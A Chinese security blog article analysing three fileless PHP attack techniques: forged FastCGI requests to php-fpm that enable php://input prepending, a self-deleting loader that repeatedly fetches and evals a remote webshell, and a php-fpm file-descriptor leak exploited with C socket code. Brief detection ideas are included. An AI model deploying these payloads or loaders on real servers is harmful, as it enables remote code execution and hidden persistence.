# **php无文件攻击浅析**

随着HW、攻防对抗的强度越来越高，各大厂商对于webshell的检测技术愈发成熟，对于攻击方来说，传统的文件落地webshell的生存空间越来越小，无文件攻击已经逐步成为新的研究趋势。

对于java的无文件攻击，师傅们已经投入极大的热情，而对于php的无文件攻击目前还处于奇技淫巧上，没有大规模的使用。这里对几种已知的php无文件攻击进行分析，希望能起到一点点抛砖引玉的作用。

## **一 fastcgi协议攻击php-fpm**

### **1.1 写在前面**

这里介绍一种通过模拟fastcgi协议直接控制php-fpm执行任意php文件的方法，全程无文件落地。

php web 项目常见的部署模式为 nginx反向代理 + php-fpm。一般来说外部访问的流程如下：

![](../Images/ca10d7adc5ef2c3ffda3e0638a323022.png)

fastcgi协议是服务器中间件和后端进行数据交换的协议，php-fpm可以理解为fastcgi协议解析器。

Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给php-fpm，php-fpm按照fastcgi协议将TCP流解析成真正的数据。

也就是说，当php-fpm可直接访问（对外开放）或间接访问（ssrf）时，通过构造恶意Fastcgi协议，向php-fpm发起攻击。

### **1.2 fastcgi解析过程**

举个栗子： 当我们访问 http://127.0.0.1/index.php?a=1&b=2 时，如果web目录是`/var/www/html`，那么Nginx会根据该请求生成如下键值对：

```
1.  `{`
    
2.  `    'GATEWAY_INTERFACE': 'FastCGI/1.0',`
    
3.  `    'REQUEST_METHOD': 'GET',`
    
4.  `    'SCRIPT_FILENAME': '/var/www/html/index.php',`
    
5.  `    'SCRIPT_NAME': '/index.php',`
    
6.  `    'QUERY_STRING': '?a=1&b=2',`
    
7.  `    'REQUEST_URI': '/index.php?a=1&b=2',`
    
8.  `    'DOCUMENT_ROOT': '/var/www/html',`
    
9.  `    'SERVER_SOFTWARE': 'php/fcgiclient',`
    
10.  `    'REMOTE_ADDR': '127.0.0.1',`
     
11.  `    'REMOTE_PORT': '12345',`
     
12.  `    'SERVER_ADDR': '127.0.0.1',`
     
13.  `    'SERVER_PORT': '80',`
     
14.  `    'SERVER_NAME': "localhost",`
     
15.  `    'SERVER_PROTOCOL': 'HTTP/1.1'`
     
16.  `}`
     
```

`SCRIPT_FILENAME`的值指向的PHP文件将会被执行，也就是`/var/www/html/index.php`。

### **1.3 攻击原理**

因此，当php-fpm可访问时（未授权访问或者ssrf），我们通过构造fastcgi协议，直接发送给php-fpm，将会执行”任意文件”。

注意这里有个前提：**这个任意文件必须是目标服务器上的文件，并不是我们能控制的文件。**

因此，如果执行真正意义上的文件，需要借助`auto_prepend_file`和`auto_append_file`。

`auto_prepend_file`是告诉PHP，在执行目标文件之前，先包含`auto_prepend_file`中指定的文件；`auto_append_file`是告诉PHP，在执行完成目标文件后，包含`auto_append_file`指向的文件。

如果想实现webshell执行任意命令的话，还需要设置`auto_prepend_file`为`php://input`。等同于在执行任何php文件前都要包含一遍POST的内容。所以，只需要把待执行的代码放在Body中就能被执行了。

POST请求示例：content为我们要执行的php代码。

```
1.  `{`
    
2.  `        'GATEWAY_INTERFACE': 'FastCGI/1.0',`
    
3.  `        'REQUEST_METHOD': 'POST',`
    
4.  `        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),`
    
5.  `        'SCRIPT_NAME': uri,`
    
6.  `        'QUERY_STRING': '',`
    
7.  `        'REQUEST_URI': uri,`
    
8.  `        'DOCUMENT_ROOT': documentRoot,`
    
9.  `        'SERVER_SOFTWARE': 'php/fcgiclient',`
    
10.  `        'REMOTE_ADDR': '127.0.0.1',`
     
11.  `        'REMOTE_PORT': '9985',`
     
12.  `        'SERVER_ADDR': '127.0.0.1',`
     
13.  `        'SERVER_PORT': '80',`
     
14.  `        'SERVER_NAME': "localhost",`
     
15.  `        'SERVER_PROTOCOL': 'HTTP/1.1',`
     
16.  `        'CONTENT_TYPE': 'application/text',`
     
17.  `        'CONTENT_LENGTH': "%d" % len(content),`
     
18.  `        'PHP_VALUE': 'auto_prepend_file = php://input',`
     
19.  `        'PHP_ADMIN_VALUE': 'allow_url_include = On'`
     
20.  `    }`
     
```

这又涉及到PHP-FPM的两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`。  
这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。

经过上述分析，通过配置`PHP_VALUE`和`PHP_ADMIN_VALUE`，使得 `auto_prepend_file = php://input`和`allow_url_include = On`，可以通过构造fastcgi执行任意命令。

值得注意的是，这种攻击方式无法绕过`disable_functions`，因为`disable_functions`选项是PHP加载的时候就已经确定，在禁用范围内的函数直接不会被加载到PHP上下文中，无法通过构造直接修改。

https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

### **1.5 检测思路**

1.  检查`PHP_VALUE`和`PHP_ADMIN_VALUE`中以上敏感字段是否被修改过。
    
2.  php-fpm通常启用很多个worker，因此需要循环检测多次，达到每个worker都经过检测的目的。
    

## **二 删除自身进程驻留**

### **2.1 写在前面**

所谓”进程驻留”的php无文件攻击，利用了PHP的”解析执行特性”。我们可以构造一个“webshell加载器”，加载器运行后删除自身，后动态加载远程文件并执行远程文件（远程文件是被当成字符串直接下载到php进程中执行），因此真正的webshell逻辑的执行是直接在内存中进行。此种方式也通常用于免杀。

### **2.2 攻击原理**

这里先介绍几个php的函数：

```
1.  `ignore_user_abort(true); `
    
```

主要用于**后台运行**。这个函数的作用是指示服务器端在远程客户端关闭连接后是否继续执行下面的脚本。如设置为True，则表示如果用户停止脚本运行，仍然不影响脚本的运行。

```
1.  `set_time_limit(0); `
    
```

主要用于**取消脚本运行时间的超时上限**。函数参数是执行时间，如果为零说明永久执行直到程序结束。如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。当然，脚本也有可能被中间件的默认超时打断，如`php.ini` 的`max_execution_time`或`Apache .conf`的`php_value max_execution_time`。

```
1.  `unlink($_SERVER['SCRIPT_FILENAME']);`
    
```

主要用于**删除自身**。值得一提的是，unlink函数运行条件较为苛刻，需要具备目录写权限。

这里看一个Demo:

```
1.  `<?php`
    
2.  `    chmod($_SERVER['SCRIPT_FILENAME'], 0777);`
    
3.  `    unlink($_SERVER['SCRIPT_FILENAME']);`
    
4.  `    ignore_user_abort(true);`
    
5.  `    set_time_limit(0);`
    
6.  `    echo "success";`
    
7.  `    $remote_file = 'http://x.x.x.x/webshell';`
    
8.  `    while($code = file_get_contents($remote_file)){`
    
9.  `    @eval($code);`
    
10.  `    echo "xunhuan";`
     
11.  `    sleep(5);`
     
12.  `    };`
     
13.  `?>`
     
```

php文件执行后，删除自身。从 http://x.x.x.x/webshell 中加载webshell的逻辑，这里为了演示是否持续执行，通过循环一直往printTime.txt中写当前时间戳：

```
1.  `file_put_contents('printTime.txt','I am running '.time());`
    
```

由于此类webshell一直在内存中执行，因此处理该请求的work进程短时间内不会被php-fpm释放，可以通过检测php-fpm status中的进程信息。

## **三 php-fpm文件描述符泄露攻击**

本节思路来源于imbeee师傅的文章： https://www.anquanke.com/post/id/163197

### **3.1 写在前面**

Linux进程使用文件描述符（FD）来管理打开的文件。

**php-fpm运行的php脚本里，使用system()等函数执行外部程序时，由于php-fpm没有使用`**FD_CLOEXEC**`处理FD，导致fork出来的子进程会继承php-fpm进程的所有FD。**

举个例子：

这是当前php-fpm work的所有FD：

![](../Images/2ddce01a7bae0090dee2010527993c5a.png)

```
1.  `<?php  system("sleep 60");>`
    
```

php-fpm在执行该文件时，会fork sleep 子进程。 sleep子进程会继承了父进程php-fpm的FD，其中包括一个关键FD：php-fpm监听的9000端口的socket ，这里是5号FD。（原文中一直在声明是0号FD，可能该值并不固定）

sleep进程号为1771，可见sleep进程继承了5号FD：

![](../Images/59fb32ce216b412cdce2db36156e01df.png)

![](../Images/64078e93d86986f774cbc34262357659.png)

在子进程里有了继承来的socket FD，就可以直接使用accept函数直接从该socket接受一个连接。

测试下：

index.php

```
1.  `<?php`
    
2.  `system("/tmp/test");`
    
```

/tmp/test.c

```
1.  `#include <stdio.h>`
    
2.  `#include <sys/socket.h>`
    
3.  `#include <netinet/in.h>`
    
4.  `int main(int argc, char *argv[])`
    
5.  `{`
    
6.  `     int sockfd, newsockfd, clilen;`
    
7.  `     struct sockaddr_in cli_addr;`
    
8.  `     clilen = sizeof(cli_addr);`
    
9.  `     //直接使用5 fd作为socket句柄，原文中是fd号为0`
    
10.  `     sockfd = 5;    `
     
11.  `     //这里accept会阻塞，接受连接后才会执行system()`
     
12.  `     newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);`
     
13.  `     system("/bin/touch /tmp/lol");`
     
14.  `     return 0;`
     
15.  `}`
     
```

编译后，访问`index.php`。发现被阻塞了。循环访问php-fpm的任意文件（循环的意义在于需要找到被污染的单个worker），此时test进程接收到socket连接，执行system()，创建了lol文件。

![](../Images/b679b47e8a32aa6c1bd08528a6c22f6f.png)

**值得注意的是，test进程在/proc/下面的文件所属用户是www（php-fpm的运行用户）而不是root（php-fpm的master进程所属用户为root），也就是说子进程继承的worker的运行权限。**

![](../Images/7c2f8729cb1985402bb7cb0f59e24ff9.png)

![](../Images/cc2b1b714785eea5aa0558e9ebb690ca.png)

### **3.2 利用方式**

**我们的目标是，在php中建立一个socket，通过该socket 操作 php-fpm的socket。**

测试一下，在php中建立一个socket：

```
1.  `<?php`
    
2.  `sleep(10);`
    
3.  `$socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );`
    
4.  `sleep(10);`
    
```

原本的worker只有 0 1 2 5四个FD。

php脚本新建socket后，多了一个3号FD（其实测试socket阻断那里就已经发现是3号FD了），也就是说我们通过一个子进程将5号FD复制到3号FD，即可实现通过该socket接管php-fpm的socket。

![](../Images/64b3c9fc42fb618bbdca8069c89f2992.png)

### **3.3 攻击Demo**

完整利用Demo可参考原文\](https://www.anquanke.com/post/id/163197)。

这里分析下具体思路：

1.  php脚本运行后先删除自身。如想完成webshell功能，可以通过解析请求fast-cgi请求，如果包含指令，拦截并执行，否则正常转发到9000端口让正常的worker处理即可。
    
2.  php脚本创建一个socket，并获取FD号。
    
3.  php脚本调用system()建立一个子进程，该子进程会继承worker运行权限。
    
4.  子进程attach到父进程(php-fpm worker)，向父进程中注入复制FD的shellcode（shellcode作用为调用dup2命令，将php-fpm socket的FD号，复制到php创建的socket的FD号（在我的测试中就是5号复制到3号）。
    
5.  子进程恢复worker进程状态后detach，退出。
    

整个过程完成后，php代码中的socket即可操作php-fpm的socket，且实现包含特定指令时才执行。

### **3.4 其他**

该方法虽然实现了对php-fpm的无文件攻击，但是可能局限性较高：

*   环境限制：只能在linux、php版本`5.x<5.6.35`、`7.0.x<7.0.29`、`7.1.x<7.1.16`、`7.2.x<7.2.4`下利用。
    
*   测试过程中发现 php-fpm socket FD号并不固定，个人觉得加个遍历比较好。
    

除此之外，子进程向worker进程注入shellcode的操作应该有更优雅的姿势，师傅们可以关注下。
